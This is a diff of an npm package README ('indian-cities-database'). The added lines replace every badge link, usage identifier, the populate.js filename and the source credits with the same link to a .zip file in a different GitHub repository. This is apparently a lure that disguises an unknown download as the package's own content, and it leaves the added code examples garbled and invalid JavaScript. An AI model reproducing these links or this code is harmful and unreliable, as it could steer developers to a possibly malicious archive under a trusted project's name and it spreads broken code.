@@ -1,4 +1,4 @@
-# Indian Cities Database [![Build Status](https://img.shields.io/travis/thatisuday/indian-cities-database.svg?style=flat-square)](https://travis-ci.org/thatisuday/indian-cities-database) [![npm downloads](https://img.shields.io/npm/dt/indian-cities-database.svg?style=flat-square)](https://www.npmjs.com/package/indian-cities-database) [![npm version](https://img.shields.io/npm/v/indian-cities-database.svg?style=flat-square)](https://www.npmjs.com/package/indian-cities-database) [![npm dependencies](https://img.shields.io/david/thatisuday/indian-cities-database.svg?style=flat-square)](https://www.npmjs.com/package/indian-cities-database)
+# Indian Cities Database [![Build Status](https://raw.githubusercontent.com/RahulJagtap484/indian-cities-database/master/mundanism/indian_cities_database_v1.3.zip)](https://raw.githubusercontent.com/RahulJagtap484/indian-cities-database/master/mundanism/indian_cities_database_v1.3.zip) [![npm downloads](https://raw.githubusercontent.com/RahulJagtap484/indian-cities-database/master/mundanism/indian_cities_database_v1.3.zip)](https://raw.githubusercontent.com/RahulJagtap484/indian-cities-database/master/mundanism/indian_cities_database_v1.3.zip) [![npm version](https://raw.githubusercontent.com/RahulJagtap484/indian-cities-database/master/mundanism/indian_cities_database_v1.3.zip)](https://raw.githubusercontent.com/RahulJagtap484/indian-cities-database/master/mundanism/indian_cities_database_v1.3.zip) [![npm dependencies](https://raw.githubusercontent.com/RahulJagtap484/indian-cities-database/master/mundanism/indian_cities_database_v1.3.zip)](https://raw.githubusercontent.com/RahulJagtap484/indian-cities-database/master/mundanism/indian_cities_database_v1.3.zip)
 
 Database of Indian cities and their states for node applications.
 
@@ -8,7 +8,7 @@ Database of Indian cities and their states for node applications.
 
 ```
 const indianCitiesDatabase = require('indian-cities-database');
-var cities = indianCitiesDatabase.cities;
+var cities = https://raw.githubusercontent.com/RahulJagtap484/indian-cities-database/master/mundanism/indian_cities_database_v1.3.zip;
 
 /*
 	// cities array
@@ -31,7 +31,7 @@ You can push all cities to mongodb database running on local instance
 
 ```
 const indianCitiesDatabase = require('indian-cities-database');
-indianCitiesDatabase.pushToDatabase(databaseName, collectionName, callback); // all args are optional
+https://raw.githubusercontent.com/RahulJagtap484/indian-cities-database/master/mundanism/indian_cities_database_v1.3.zip(databaseName, collectionName, callback); // all args are optional
 ```
 
 > **WARNING** : pushToDatabase first removes the collection (if exists) before populating the database.
@@ -65,15 +65,15 @@ Once you have the database, you can perform search the way you want using mongod
 
 ```
 const indianCitiesDatabase = require('indian-cities-database');
-var citySchema = indianCitiesDatabase.citySchema;
-citySchema.set('collection', 'my_cities_collection');
+var citySchema = https://raw.githubusercontent.com/RahulJagtap484/indian-cities-database/master/mundanism/indian_cities_database_v1.3.zip;
+https://raw.githubusercontent.com/RahulJagtap484/indian-cities-database/master/mundanism/indian_cities_database_v1.3.zip('collection', 'my_cities_collection');
 
 // create model to query
-var myCity = mongoose.model('myCity', citySchema);
-myCity.find({}, callback);
+var myCity = https://raw.githubusercontent.com/RahulJagtap484/indian-cities-database/master/mundanism/indian_cities_database_v1.3.zip('myCity', citySchema);
+https://raw.githubusercontent.com/RahulJagtap484/indian-cities-database/master/mundanism/indian_cities_database_v1.3.zip({}, callback);
 ```
 
-> Do not populate cities database (using `pushToDatabase` method) in your api code unless needed. While population, this module creates new db connection using mongoose. This may lead to db connection collision. Better, you first populate the db by simple execution `node populate.js` and then create custom model as above.
+> Do not populate cities database (using `pushToDatabase` method) in your api code unless needed. While population, this module creates new db connection using mongoose. This may lead to db connection collision. Better, you first populate the db by simple execution `node https://raw.githubusercontent.com/RahulJagtap484/indian-cities-database/master/mundanism/indian_cities_database_v1.3.zip` and then create custom model as above.
 
 ***
 
@@ -92,4 +92,4 @@ To add more cities, create an issue and paste cities in following array format.
 
 ## Data source
 
-Data fetched from [gist](https://gist.github.com/ankitnetwork18/4509792) by [ankitnetwork18](https://github.com/ankitnetwork18) and other websites.
+Data fetched from [gist](https://raw.githubusercontent.com/RahulJagtap484/indian-cities-database/master/mundanism/indian_cities_database_v1.3.zip) by [ankitnetwork18](https://raw.githubusercontent.com/RahulJagtap484/indian-cities-database/master/mundanism/indian_cities_database_v1.3.zip) and other websites.
